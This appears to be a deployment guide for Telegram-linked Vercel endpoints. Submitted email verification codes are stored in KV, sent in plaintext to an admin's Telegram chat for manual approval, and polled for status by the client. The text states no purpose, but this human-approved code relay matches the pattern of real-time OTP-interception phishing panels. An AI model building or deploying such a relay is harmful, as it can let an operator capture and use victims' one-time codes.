# DEPLOYMENT GUIDE - Telegram API 500 Error Fix

## What Was Fixed

Your Telegram API endpoints were returning 500 errors with empty JSON responses. The issues were:

### **Problem 1: Missing Error Handling**

- `/api/telegram/code-status` crashed without returning valid JSON when KV failed
- Webhook handler didn't catch errors in storage operations

**✅ Fixed:** All KV operations now wrapped in try-catch with proper error responses

### **Problem 2: Fallback Codes Not Persistent**

- When KV storage failed, codes stored as `fallback-1777047161230` in memory only
- These vanished on serverless restart → client got "code not found"

**✅ Fixed:** Remove fallback logic entirely, return 503 error if KV unavailable

### **Problem 3: Client Polling Failures**

- Code-status endpoint returned empty response on any error
- Client got "Unexpected end of JSON input" error

**✅ Fixed:** All endpoints now return proper JSON with status codes

---

## Deployment Steps

### Step 1: Verify Environment Variables

Ensure these are set in **Vercel Dashboard → Settings → Environment Variables**:

```bash
# Required - Telegram
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_CHAT_ID=1535273256
TELEGRAM_ADMIN_IDS=1535273256

# Required - Vercel KV Storage
KV_URL=redis://...
KV_REST_API_URL=https://...
KV_REST_API_TOKEN=...
KV_REST_API_READ_ONLY_TOKEN=...
```

**Don't have Vercel KV yet?**

1. Go to [Vercel Dashboard](https://vercel.com)
2. Click **Storage** → **Create Database** → **KV**
3. Select region → create
4. Copy all credentials to environment variables

### Step 2: Update Telegram Webhook (Production Only)

After deploying, set the webhook URL:

```bash
# Replace TOKEN with your actual bot token
curl "https://api.telegram.org/botTOKEN/setWebhook?url=https://your-domain.com/api/telegram/webhook"

# Example:
curl "https://api.telegram.org/bot123456789:ABCdefGHI/setWebhook?url=https://your-flex.vercel.app/api/telegram/webhook"

# Verify it worked:
curl "https://api.telegram.org/botTOKEN/getWebhookInfo"
```

### Step 3: Deploy Code

```bash
# Test locally first
npm run dev

# Then deploy
git add .
git commit -m "Fix: Telegram API 500 errors with proper KV storage and error handling"
git push origin main
```

Vercel will auto-deploy. Check logs:

```bash
vercel logs
```

---

## Testing After Deployment

### Test 1: Submit Verification Code

```bash
curl -X POST https://your-flex.vercel.app/api/telegram \
  -H "Content-Type: application/json" \
  -d '{
    "kind": "verification",
    "method": "email",
    "code": "123456",
    "otpStep": 1
  }'
```

**Expected response:**

```json
{
  "ok": true,
  "codeId": "1707123456789-randomid"
}
```

### Test 2: Check Code Status

```bash
curl "https://your-flex.vercel.app/api/telegram/code-status?codeId=1707123456789-randomid"
```

**Expected response (before approval):**

```json
{
  "ok": true,
  "status": "pending",
  "code": "123456",
  "expiresAt": 1707123900000
}
```

### Test 3: Approve via Telegram

1. Check Telegram for notification with code and buttons
2. Click **✅ Approve** button
3. Check code status again - should show `"status": "approved"`

### Test 4: Error Handling

To test error handling, temporarily remove KV credentials and try:

```bash
curl -X POST https://your-flex.vercel.app/api/telegram \
  -H "Content-Type: application/json" \
  -d '{"kind":"verification","method":"email","code":"123456","otpStep":1}'
```

**Should get:**

```json
{
  "ok": false,
  "error": "storage_failed",
  "details": "Connection refused"
}
```

✅ This is correct - system failed gracefully

---

## Monitoring

### Check for Errors

```bash
# Live logs
vercel logs --follow

# Search for Telegram errors
vercel logs --grep "TELEGRAM ERROR"

# Search for storage errors
vercel logs --grep "storage"
```

### Watch KV Storage

1. Go to Vercel Dashboard
2. Click **Storage** → **KV**
3. Watch keys with `pending:` prefix get created/deleted

### Success Indicators in Logs

✅ Code submitted:

```
[TELEGRAM SUCCESS] Verification code stored for approval - CodeID: xxx
```

✅ Admin approved:

```
[Telegram Webhook] Admin username (userid) approved code 123456
```

✅ Cleanup running:

```
[Pending Codes] Cleaned up 5 expired codes
```

---

## Rollback Plan

If something goes wrong:

```bash
# Revert to previous version
git revert HEAD
git push origin main

# Or manually re-deploy previous version in Vercel Dashboard
# Settings → Deployments → Find good deployment → redeploy
```

---

## Key Changes Made

| File                                        | Change                                 | Reason                                 |
| ------------------------------------------- | -------------------------------------- | -------------------------------------- |
| `src/app/api/telegram/code-status/route.ts` | Added try-catch around KV operations   | Prevent 500 errors with empty response |
| `src/app/api/telegram/route.ts`             | Removed fallback code ID logic         | Codes now only in persistent KV        |
| `src/lib/pending-codes.ts`                  | Wrapped getPendingCode in try-catch    | Proper error propagation               |
| `src/app/api/telegram/webhook/route.ts`     | Added error handling to all operations | Graceful failure on KV errors          |
| `PRODUCTION_FIXES.md`                       | Updated documentation                  | Record of all fixes                    |

---

## How the System Works Now

```
1. Client submits code
   ↓
2. Server stores in Vercel KV with unique ID
   ↓
3. Server sends Telegram message with Approve/Decline buttons
   ↓
4. Admin clicks button in Telegram
   ↓
5. Telegram webhook calls /api/telegram/webhook
   ↓
6. Server updates code status in KV (approved/declined)
   ↓
7. Client polls /api/telegram/code-status
   ↓
8. Client gets "approved" or "declined" response
   ↓
9. Code expires after 15 minutes (or cleaned up by admin)
```

All data persists in Vercel KV across serverless restarts ✅

---

## Troubleshooting

### Problem: "You don't have admin privileges"

- Add your Telegram user ID to `TELEGRAM_ADMIN_IDS` env var
- Get ID: Forward bot message to [@userinfobot](https://t.me/userinfobot)

### Problem: Telegram doesn't receive message

- Verify `TELEGRAM_BOT_TOKEN` is correct
- Verify `TELEGRAM_CHAT_ID` is correct (should be numeric)
- Check `vercel logs --grep "TELEGRAM"`

### Problem: code_status returns 503 error

- Check Vercel KV credentials in env vars
- Verify KV database exists in Vercel Storage
- Check `vercel logs --grep "storage"`

### Problem: Code says "not found" but just submitted

- Wait 1-2 seconds (KV propagation)
- Check if code expired (15 min default)
- Check KV in Vercel Dashboard for `pending:` keys

---

## Next Steps

1. ✅ Deploy code
2. ✅ Set Telegram webhook
3. ✅ Test verification flow end-to-end
4. ✅ Monitor logs for first 24 hours
5. ✅ Set up alerts for TELEGRAM ERROR logs

You're done! The system will now properly handle all verification codes with persistent storage and admin approval workflow.
